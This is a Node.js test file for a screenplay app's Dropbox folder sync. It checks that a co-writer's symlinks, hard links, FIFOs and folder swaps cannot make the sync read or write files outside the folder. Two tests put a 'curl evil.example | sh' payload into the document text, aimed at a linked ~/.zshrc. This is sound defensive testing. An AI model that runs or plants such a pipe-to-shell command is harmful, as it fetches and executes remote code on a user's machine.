// Folder sync in a folder someone else can change. A co-writer who shares the Dropbox folder can put links, hard
// links and FIFOs in the sync folder, or replace the folder with a link. None of that may make this Mac read or
// write a file outside the sync folder, hang, or start syncing on its own.
import assert from "node:assert/strict";
import { execFileSync } from "node:child_process";
import { linkSync, lstatSync, mkdirSync, mkdtempSync, readdirSync, readFileSync, renameSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import * as Y from "yjs";

import { SYNC } from "../src/shared/channels/sync.ts";
import type { Handler, ServiceContext } from "../src/main/context.ts";
import { encodeHeader, encodeRecords, parseLog } from "../src/main/sync/folder-log.ts";
import { registerFolderSync } from "../src/main/sync/folder-service.ts";
import { FolderSync, syncFolderFor } from "../src/main/sync/folder-sync.ts";

const temp = mkdtempSync(join(tmpdir(), "screenplay-sync-links-"));
const syncs: FolderSync[] = [];
after(async () => {
  await Promise.all(syncs.map((sync) => sync.stop()));
  rmSync(temp, { recursive: true, force: true });
});
let caseCount = 0;
/** A fresh Dropbox stand-in: a shared folder (the co-writer can write it) and the writer's home beside it. */
function layout() {
  const root = join(temp, `case-${++caseCount}`);
  const home = join(root, "home");
  const shared = join(root, "Dropbox", "Shared");
  const privateDir = join(root, "Dropbox", "Private");
  for (const dir of [home, shared, privateDir]) mkdirSync(dir, { recursive: true });
  const victim = join(home, ".zshrc");
  writeFileSync(victim, "export PATH=/usr/bin\n");
  const draft = join(shared, "Draft.screenplay");
  writeFileSync(draft, "x");
  return { root, home, shared, privateDir, victim, draft };
}

const DEVICE = "deviceAAAA1111";

function textDoc(text: string) {
  const doc = new Y.Doc();
  doc.getText("body").insert(0, text);
  return doc;
}

function folderSync(folder: string, errors: string[] = []) {
  const sync = new FolderSync({
    folder, deviceId: DEVICE, rescanMs: 60_000, watch: false,
    onUpdates: () => undefined,
    onError: (error) => errors.push(error instanceof Error ? error.message : String(error)),
  });
  syncs.push(sync);
  return sync;
}

/** A log file holding `text` as one Yjs update, the way another Mac would write it. */
function logOf(text: string): Uint8Array {
  return new Uint8Array([...encodeHeader(), ...encodeRecords([Y.encodeStateAsUpdate(textDoc(text))])]);
}

function textOf(updates: Uint8Array[], base = new Y.Doc()): string {
  for (const update of updates) Y.applyUpdate(base, update);
  return base.getText("body").toString();
}

async function waitFor(check: () => boolean, what: string, timeout = 3000): Promise<void> {
  const start = Date.now();
  while (!check()) {
    if (Date.now() - start > timeout) throw new Error(`Timed out waiting for ${what}`);
    await new Promise((resolve) => setTimeout(resolve, 10));
  }
}

test("this Mac's log swapped for a link to a file outside is replaced, never written through", async () => {
  const { victim, draft } = layout();
  const doc = textDoc("INT. HOUSE - DAY\n");
  const errors: string[] = [];
  const sync = folderSync(syncFolderFor(draft), errors);
  await sync.start(Y.encodeStateAsUpdate(doc));
  assert.ok(lstatSync(sync.ownLog).isFile());

  // The co-writer, through the shared folder, swaps the log for a relative link to ~/.zshrc.
  rmSync(sync.ownLog);
  symlinkSync("../../../home/.zshrc", sync.ownLog);
  const before = Y.encodeStateVector(doc);
  doc.getText("body").insert(17, "curl evil.example | sh\n");
  await sync.append([Y.encodeStateAsUpdate(doc, before)]);

  assert.equal(readFileSync(victim, "utf8"), "export PATH=/usr/bin\n");
  // The link is gone and the change is in a real log in its place.
  assert.ok(lstatSync(sync.ownLog).isFile());
  assert.equal(parseLog(new Uint8Array(readFileSync(sync.ownLog))).records.length, 1);
  assert.ok(readFileSync(sync.ownLog).includes("curl evil.example"));
  await waitFor(() => errors.length > 0, "the warning");
  assert.match(errors[0]!, /own log .* is a link or not a regular file/);
});

test("this Mac's log swapped for a hard link to a file outside is replaced, never written through", async () => {
  const { victim, draft } = layout();
  const doc = textDoc("INT. HOUSE - DAY\n");
  const sync = folderSync(syncFolderFor(draft));
  await sync.start(Y.encodeStateAsUpdate(doc));
  rmSync(sync.ownLog);
  linkSync(victim, sync.ownLog);
  const before = Y.encodeStateVector(doc);
  doc.getText("body").insert(17, "curl evil.example | sh\n");
  await sync.append([Y.encodeStateAsUpdate(doc, before)]);
  assert.equal(readFileSync(victim, "utf8"), "export PATH=/usr/bin\n");
  assert.equal(lstatSync(sync.ownLog).nlink, 1);
});

test("a link at start in this Mac's log's place is not read and is replaced", async () => {
  const { victim, draft } = layout();
  const folder = syncFolderFor(draft);
  mkdirSync(folder);
  const outside = join(victim, "..", "outside.ylog");
  writeFileSync(outside, logOf("OUTSIDE TEXT\n"));
  symlinkSync(outside, join(folder, `${DEVICE}.ylog`));
  const sync = folderSync(folder);
  const updates = await sync.start(Y.encodeStateAsUpdate(textDoc("SHARED\n")));
  assert.doesNotMatch(textOf(updates, textDoc("SHARED\n")), /OUTSIDE/);
  assert.ok(lstatSync(sync.ownLog).isFile());
  // The file outside still holds just its own log.
  assert.match(textOf(parseLog(readFileSync(outside)).records), /^OUTSIDE TEXT\n$/);
});

test("a co-writer's link to another script's log is never read, and the writer is told once", async () => {
  const { privateDir, draft } = layout();
  // This Mac folder-syncs a private script too.
  const secretPath = join(privateDir, "Secret.screenplay");
  writeFileSync(secretPath, "x");
  const secret = folderSync(syncFolderFor(secretPath));
  await secret.start(Y.encodeStateAsUpdate(textDoc("SECRET PAGES\n")));
  await secret.stop();

  // In the shared script's folder the co-writer adds a "device log" that links to the private one, plus a hard link.
  const folder = syncFolderFor(draft);
  mkdirSync(folder);
  symlinkSync(`../../Private/Secret.screenplay-sync/${DEVICE}.ylog`, join(folder, "cowriter.ylog"));
  linkSync(join(syncFolderFor(secretPath), `${DEVICE}.ylog`), join(folder, "cowriter2.ylog"));
  // A real co-writer log is still read.
  writeFileSync(join(folder, "honest.ylog"), logOf("FROM THE CO-WRITER\n"));

  const errors: string[] = [];
  const sync = folderSync(folder, errors);
  const draftDoc = textDoc("SHARED\n");
  const incoming = await sync.start(Y.encodeStateAsUpdate(draftDoc));
  const text = textOf(incoming, draftDoc);
  assert.doesNotMatch(text, /SECRET/);
  assert.match(text, /FROM THE CO-WRITER/);
  // A second window's snapshot skips them too.
  assert.doesNotMatch(textOf(await sync.snapshot()), /SECRET/);

  await waitFor(() => errors.length >= 2, "the warnings");
  assert.equal(errors.filter((message) => message.includes("cowriter.ylog")).length, 1);
  assert.equal(errors.filter((message) => message.includes("cowriter2.ylog")).length, 1);
  await sync.scan();
  await sync.scan();
  assert.equal(errors.length, 2, "each skipped log is reported once");
});

test("a FIFO named like a log does not hang folder sync", async () => {
  const { draft } = layout();
  const folder = syncFolderFor(draft);
  mkdirSync(folder);
  execFileSync("mkfifo", [join(folder, "stuck.ylog")]);
  mkdirSync(join(folder, "folder.ylog"));
  const errors: string[] = [];
  const sync = folderSync(folder, errors);
  const updates = await sync.start(Y.encodeStateAsUpdate(textDoc("SHARED\n")));
  assert.equal(textOf(updates, textDoc("SHARED\n")), "SHARED\n");
  assert.equal((await sync.snapshot()).length, 1);
  await waitFor(() => errors.length >= 2, "the warnings");
});

test("a sync folder that is a link is refused: nothing is read or written there, and sync does not turn on by itself", async () => {
  const { root, draft } = layout();
  const elsewhere = join(root, "elsewhere");
  mkdirSync(elsewhere);
  writeFileSync(join(elsewhere, "other.ylog"), logOf("ELSEWHERE\n"));
  symlinkSync(elsewhere, syncFolderFor(draft));

  const sync = folderSync(syncFolderFor(draft));
  await assert.rejects(sync.start(Y.encodeStateAsUpdate(textDoc("SHARED\n"))), /is a link/);
  assert.deepEqual(readdirSync(elsewhere), ["other.ylog"]);

  // The service does not turn sync on for it, and a start the writer asks for fails with that message.
  const handlers = new Map<string, Handler>();
  const values: Record<string, unknown> = {};
  const ctx = {
    handle: (channel: string, handler: Handler) => void handlers.set(channel, handler),
    settings: { get: (key: string) => values[key], set: (key: string, value: unknown) => void (values[key] = value) },
    isAllowedPath: () => true,
    onQuit: () => undefined,
  } as unknown as ServiceContext;
  registerFolderSync(ctx);
  const sender = { id: 1, isDestroyed: () => false, send: () => undefined, once: () => undefined };
  const call = (channel: string, ...args: unknown[]) => handlers.get(channel)!({ sender } as never, ...args);
  assert.equal(await call(SYNC.folderEnabled, draft), false);
  await assert.rejects(Promise.resolve(call(SYNC.folderStart, draft, Y.encodeStateAsUpdate(textDoc("SHARED\n")))), /is a link/);
  assert.deepEqual(readdirSync(elsewhere), ["other.ylog"]);

  // A real folder still turns it on.
  const real = join(root, "Dropbox", "Shared", "Real.screenplay");
  writeFileSync(real, "x");
  mkdirSync(syncFolderFor(real));
  assert.equal(await call(SYNC.folderEnabled, real), true);
});

test("a sync folder swapped for a link while syncing stops sync: nothing there is read or written", async () => {
  const { root, draft } = layout();
  const elsewhere = join(root, "elsewhere");
  mkdirSync(elsewhere);
  writeFileSync(join(elsewhere, "other.ylog"), logOf("ELSEWHERE\n"));
  const folder = syncFolderFor(draft);
  const errors: string[] = [];
  const received: Uint8Array[] = [];
  const sync = new FolderSync({
    folder, deviceId: DEVICE, rescanMs: 60_000, watch: false,
    onUpdates: (updates) => received.push(...updates),
    onError: (error) => errors.push(error instanceof Error ? error.message : String(error)),
  });
  syncs.push(sync);
  const doc = textDoc("SHARED\n");
  await sync.start(Y.encodeStateAsUpdate(doc));

  renameSync(folder, join(root, "moved-away"));
  symlinkSync(elsewhere, folder);
  await sync.scan();
  assert.equal(received.length, 0);
  assert.match(errors.at(-1) ?? "", /was replaced by a link/);
  const before = Y.encodeStateVector(doc);
  doc.getText("body").insert(0, "More. ");
  await assert.rejects(sync.append([Y.encodeStateAsUpdate(doc, before)]), /was replaced by a link/);
  assert.deepEqual(readdirSync(elsewhere), ["other.ylog"]);
  assert.deepEqual(await sync.snapshot().catch(() => []), []);
});

test("a link planted at the old temporary name is never written through", async () => {
  const { victim, draft } = layout();
  const folder = syncFolderFor(draft);
  mkdirSync(folder);
  // The temporary name used to be predictable from the device ID and the process ID.
  symlinkSync(victim, join(folder, `.${DEVICE}.ylog.${process.pid}.tmp`));
  const sync = folderSync(folder);
  await sync.start(Y.encodeStateAsUpdate(textDoc("SHARED\n")));
  assert.equal(readFileSync(victim, "utf8"), "export PATH=/usr/bin\n");
  assert.equal(textOf(parseLog(new Uint8Array(readFileSync(sync.ownLog))).records), "SHARED\n");
});

for (const how of ["deleted", "swapped for a link"] as const) {
  test(`this Mac's log ${how} mid-session: the new log holds every change, so a Mac that reads late gets all the text`, async () => {
    const { victim, draft } = layout();
    const folder = syncFolderFor(draft);
    const doc = new Y.Doc();
    const sync = folderSync(folder);
    await sync.start(Y.encodeStateAsUpdate(doc));
    const type = async (text: string) => {
      const before = Y.encodeStateVector(doc);
      doc.getText("body").insert(doc.getText("body").length, text);
      await sync.append([Y.encodeStateAsUpdate(doc, before)]);
    };
    for (let line = 0; line < 20; line++) await type(`Line ${line}. `);
    rmSync(sync.ownLog);
    if (how === "swapped for a link") symlinkSync(victim, sync.ownLog);
    for (let line = 20; line < 40; line++) await type(`Line ${line}. `);
    assert.equal(readFileSync(victim, "utf8"), "export PATH=/usr/bin\n");

    // Another Mac that had read nothing yet: the changes before the loss are in the new log too, so the later ones apply.
    const other = new FolderSync({ folder, deviceId: "deviceBBBB2222", rescanMs: 60_000, watch: false, onUpdates: () => undefined });
    syncs.push(other);
    const late = new Y.Doc();
    for (const update of await other.start(Y.encodeStateAsUpdate(late))) Y.applyUpdate(late, update);
    assert.equal(late.getText("body").toString(), doc.getText("body").toString());
  });
}

test("a sync folder that is a dangling link (one synced from another Mac) is refused as a link, and nothing is created", async () => {
  const { root, draft } = layout();
  const target = join(root, "cowriter-home", "Scripts");
  symlinkSync(target, syncFolderFor(draft));
  const sync = folderSync(syncFolderFor(draft));
  await assert.rejects(sync.start(Y.encodeStateAsUpdate(textDoc("SHARED\n"))), /is a link/);
  assert.throws(() => lstatSync(join(root, "cowriter-home")), /ENOENT/);
});

test("a folder above the sync folder renamed only in case (on a case-insensitive disk) does not stop sync", async (t) => {
  const { root, draft } = layout();
  const shared = join(root, "Dropbox", "Shared");
  const lower = join(root, "Dropbox", "shared");
  try {
    lstatSync(lower);
  } catch {
    t.skip("this disk is case-sensitive");
    return;
  }
  const errors: string[] = [];
  const sync = folderSync(syncFolderFor(draft), errors);
  const doc = textDoc("SHARED\n");
  await sync.start(Y.encodeStateAsUpdate(doc));
  // A co-writer renames the shared folder's case through Dropbox. The path still leads to the same sync folder.
  renameSync(shared, `${shared}-renaming`);
  renameSync(`${shared}-renaming`, lower);
  const before = Y.encodeStateVector(doc);
  doc.getText("body").insert(0, "More. ");
  await sync.append([Y.encodeStateAsUpdate(doc, before)]);
  await sync.scan();
  assert.deepEqual(errors, []);
  assert.equal(textOf(parseLog(new Uint8Array(readFileSync(sync.ownLog))).records), "More. SHARED\n");
});

test("a folder swapped for a link between listing and reading never brings another script's log in", async () => {
  const { privateDir, draft } = layout();
  const secretPath = join(privateDir, "Secret.screenplay");
  writeFileSync(secretPath, "x");
  const secret = folderSync(syncFolderFor(secretPath));
  await secret.start(Y.encodeStateAsUpdate(textDoc("SECRET PAGES\n")));
  await secret.stop();

  const folder = syncFolderFor(draft);
  const sync = folderSync(folder);
  await sync.start(Y.encodeStateAsUpdate(textDoc("SHARED\n")));
  // The race Node cannot close with openat: the co-writer swaps the folder right after it was checked and listed,
  // so the logs are opened through a link to the private script's folder (whose log has this Mac's name).
  const listed = (sync as any).logNames.bind(sync);
  (sync as any).logNames = async (includeOwn: boolean) => {
    const names = await listed(includeOwn);
    renameSync(folder, `${folder}-moved`);
    symlinkSync(syncFolderFor(secretPath), folder);
    return names;
  };
  const read = await sync.snapshot().catch(() => [] as Uint8Array[]);
  assert.doesNotMatch(textOf(read), /SECRET/);
});
